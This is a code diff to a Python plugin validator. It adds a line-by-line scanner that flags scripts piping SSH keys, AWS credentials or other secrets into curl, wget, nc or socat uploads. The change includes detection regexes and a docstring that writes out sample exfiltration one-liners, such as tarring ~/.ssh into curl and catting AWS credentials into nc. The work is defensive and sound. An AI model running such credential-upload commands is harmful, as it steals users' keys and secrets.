@@ -9,6 +9,7 @@ code quality issues, and potential bugs via CWE/OWASP patterns.
 
 from __future__ import annotations
 
+import re
 from pathlib import Path
 
 from skillevaluator.config import CONFIG_DIR
@@ -16,6 +17,56 @@ from skillevaluator.constants import SCAN_EXCLUDED_DIRS, SCAN_EXCLUDED_FILES
 from skillevaluator.utils.tool_runner import Severity, Tools, parse_json_output
 from skillevaluator.validators.base import Finding, ValidationResult, ValidatorBase, iter_scannable_files
 from skillevaluator.validators.plugin_tree import plugin_tree_scan_view, rewrite_finding_path_prefix
+
+# Files a pipeline-exfiltration check reads (shell, Python, and JavaScript), and the largest one it reads.
+_EXFIL_SCAN_SUFFIXES = frozenset({".sh", ".bash", ".zsh", ".py", ".js", ".mjs", ".cjs", ".ts"})
+_EXFIL_MAX_FILE_BYTES = 1024 * 1024
+# An extensionless file is read when its first line is a shell, Python, or Node shebang ('#!/bin/sh',
+# '#!/usr/bin/env -S python3 -u'), or when it is an executable under bin/: Claude Code puts a plugin's bin/
+# on PATH, and a shell runs an executable without a shebang as a shell script.
+_SCRIPT_SHEBANG_RE = re.compile(rb"#!.*?(?<![\w-])(?:(?:ba|da|z|k|fi)?sh|python[\d.]*|node(?:js)?|deno|bun)(?![\w-])")
+_SHEBANG_READ_BYTES = 128
+# Credential and key material: ~/.ssh, ~/.aws, ~/.gnupg, ~/.netrc, ~/.kube, ~/.docker, private keys, /etc/shadow.
+_SENSITIVE_PATH_RE = re.compile(
+    r"(?:~|\$\{?HOME\}?)/\.(?:ssh|aws|gnupg|netrc|kube|docker|git-credentials|config/gcloud|azure)\b"
+    r"|\bid_(?:rsa|ed25519|ecdsa|dsa)\b|/etc/(?:passwd|shadow)\b|\.aws/credentials\b"
+)
+# An upload that sends its standard input: curl -T - / --upload-file - / --data-binary @- / -F f=@-,
+# wget --post-file=/dev/stdin, or a raw socket (nc, ncat, socat).
+_STDIN_UPLOAD_RE = re.compile(
+    r"\bcurl\b[^;&\n]*?\s(?:-T\s*-|--upload-file[=\s]+-|--data(?:-binary|-raw|-urlencode)?[=\s]+@-|-d\s*@-"
+    r"|-F\s*['\"]?[\w.-]+=[@<]-)(?=[\s'\"]|$)"
+    r"|\bwget\b[^;&\n]*--post-file[=\s]+(?:-|/dev/stdin)(?=[\s'\"]|$)|^\s*(?:nc|ncat|netcat|socat)\b",
+    re.IGNORECASE,
+)
+# An upload of a named file: curl -T FILE / --upload-file FILE / -F f=@FILE / --data-binary @FILE.
+_FILE_UPLOAD_RE = re.compile(
+    r"\bcurl\b[^;&|\n]*?\s(?:-T\s*|--upload-file[=\s]+|--data(?:-binary|-raw)?[=\s]+@|-d\s*@"
+    r"|-F\s*['\"]?[\w.-]+=[@<])['\"]?(?P<file>[^\s'\";&|]+)",
+    re.IGNORECASE,
+)
+
+
+def _exfiltration_line(line: str) -> bool:
+    """Whether one line pipes credential material into an upload, or uploads a credential file directly."""
+    if not _SENSITIVE_PATH_RE.search(line):
+        return False
+    stages = re.split(r"(?<!\|)\|(?!\|)", line)
+    for index, stage in enumerate(stages):
+        if _SENSITIVE_PATH_RE.search(stage) and any(_STDIN_UPLOAD_RE.search(later) for later in stages[index + 1 :]):
+            return True
+    return any(_SENSITIVE_PATH_RE.search(match.group("file")) for match in _FILE_UPLOAD_RE.finditer(line))
+
+
+def _is_extensionless_script(file_path: Path) -> bool:
+    """Whether an extensionless file is a script: a shell, Python, or Node shebang, or an executable in bin/."""
+    if file_path.suffix:
+        return False
+    if file_path.parent.name == "bin" and file_path.stat().st_mode & 0o111:
+        return True
+    with file_path.open("rb") as handle:
+        head = handle.read(_SHEBANG_READ_BYTES)
+    return _SCRIPT_SHEBANG_RE.match(head.split(b"\n", 1)[0]) is not None
 
 
 def _semgrep_file_excludes() -> list[str]:
@@ -73,6 +124,9 @@ class CodeRiskValidator(ValidatorBase):
         """Run static analysis on a single skill directory."""
         result = ValidationResult()
 
+        # The exfiltration read needs no scanner, so it also covers .bash, .zsh, and extensionless
+        # shebang scripts that the Bandit and Semgrep file count below does not.
+        result.merge(self._scan_exfiltration(skill_path))
         file_counts = self._count_code_files(skill_path)
         if not any(file_counts.values()):
             result.add_message("No code files found - skipping code risk analysis")
@@ -98,6 +152,49 @@ class CodeRiskValidator(ValidatorBase):
                 rewrite_finding_path_prefix(scanned, str(view.path.resolve()), str(skill_path.resolve()))
         result.merge(scanned)
 
+        return result
+
+    @staticmethod
+    def _scan_exfiltration(skill_path: Path) -> ValidationResult:
+        """HIGH for a script line that sends credential material to an upload (no scanner needed).
+
+        ``tar cz ~/.ssh | curl -T - https://...``, ``cat ~/.aws/credentials | nc host 443``,
+        and ``curl -F f=@~/.ssh/id_rsa https://...`` read keys or credentials and
+        upload them. Bandit and the packaged Semgrep rules do not model these
+        shell pipelines, so they are read here, line by line, without running
+        anything.
+        """
+        result = ValidationResult()
+        # One walk: '' matches every file, and an extensionless one is kept only when it is a script.
+        for file_path in sorted(iter_scannable_files(skill_path, {*_EXFIL_SCAN_SUFFIXES, ""})):
+            try:
+                if file_path.is_symlink() or file_path.stat().st_size > _EXFIL_MAX_FILE_BYTES:
+                    continue
+                if file_path.suffix not in _EXFIL_SCAN_SUFFIXES and not _is_extensionless_script(file_path):
+                    continue
+                text = file_path.read_text(encoding="utf-8", errors="replace")
+            except OSError:
+                continue
+            for line_number, line in enumerate(text.splitlines(), 1):
+                if not _exfiltration_line(line):
+                    continue
+                try:
+                    relative = file_path.relative_to(skill_path).as_posix()
+                except ValueError:
+                    relative = file_path.name
+                result.add_structured_finding(
+                    Finding(
+                        category="CODE_RISK",
+                        severity=Severity.HIGH,
+                        check_name="credential_exfiltration_pipeline",
+                        message="The script sends credential or key material (~/.ssh, ~/.aws, a private key, ...) "
+                        "to an upload or a network socket",
+                        file_path=relative,
+                        line_number=line_number,
+                        suggestion="Remove the upload; a plugin must not read or send the user's credentials.",
+                    ),
+                    is_error=True,
+                )
         return result
 
     def _count_code_files(self, skill_path: Path) -> dict[str, int]:
